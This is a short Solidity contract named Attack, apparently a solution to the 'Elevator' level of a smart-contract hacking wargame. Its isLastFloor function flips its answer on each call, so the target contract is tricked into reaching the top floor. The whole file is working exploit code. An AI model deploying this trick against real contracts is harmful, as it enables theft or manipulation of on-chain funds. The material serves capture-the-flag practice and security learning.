// SPXD-License-Identifier: MIT
pragma solidity ^0.8.13;


contract Attack {
    bool public side = true;
    Elevator public level;

    constructor(address _level) {
        level = Elevator(_level);
    }

    function isLastFloor(uint) public returns(bool) {
        side = !side;
        return side;
    }

    function attack(uint _floor) public{
        level.goTo(_floor);
    }

}